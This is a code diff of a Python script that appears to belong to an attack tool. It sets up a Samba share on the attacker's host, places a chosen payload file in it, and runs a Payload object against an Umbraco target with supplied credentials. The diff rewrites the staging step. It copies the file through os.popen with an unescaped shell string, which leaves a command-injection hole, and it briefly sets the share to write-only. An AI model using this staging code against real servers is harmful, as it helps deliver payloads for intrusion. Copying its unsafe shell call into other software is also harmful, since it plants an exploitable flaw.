@@ -5,6 +5,7 @@ import sys
 import os
 import stat
 import argparse
+from subprocess import Popen
 from custompayload import Payload
 
 pkg_name = "samba"
@@ -17,7 +18,7 @@ apt_pkg.init_system()
 cache = apt_pkg.Cache()
 depcache = apt_pkg.DepCache(cache)
 
-def setup():
+def setup(f):
 
     pkg = cache[pkg_name]
     
@@ -32,19 +33,21 @@ def setup():
             os.mkdir(smb_pub_path)
         else:
             print("Directory already exists! Checking permissions...")
-
-            st = os.stat(smb_pub_path)
-            
-            # set access to directory 
-            if not oct(st.st_mode)[-3:] == "555":
-                os.chmod(smb_pub_path, 0o555)
-            
-            # recursively chown all contents
-            # this is done in the event the staged smb directory already exists
-            r_chown(smb_pub_path)
     except OSError:
         print("Error unable to create dir")
         sys.exit(-1)
+    
+    st = os.stat(smb_pub_path)
+    
+    # give write permissions so we can upload the file
+    os.chmod(smb_pub_path, 0o222)
+            
+    if f and os.popen("cp {load} {dest}".format(load=f, dest=smb_pub_path)):
+        print("File copied")
+            
+    # set access to directory 
+    if not oct(st.st_mode)[-3:] == "555":
+        os.chmod(smb_pub_path, 0o555)
 
     # copy the smb config that was setup for this job
     if os.path.isfile(smb_conf_path):
@@ -80,9 +83,8 @@ if __name__ == "__main__":
     parser.add_argument("--passw", "-U", required=True, help="Password for Umbraco", type=str)
     args = parser.parse_args()
    
-    setup()
+    setup(args.load)
 
-    if args.load:
-        os.popen("cp {load} {dest}".format(load=args.load,dest=smb_pub_path))
-
+    r_chown(smb_pub_path)
+    
     Payload(args.target, args.host, args.port, args.user, args.passw).execute()
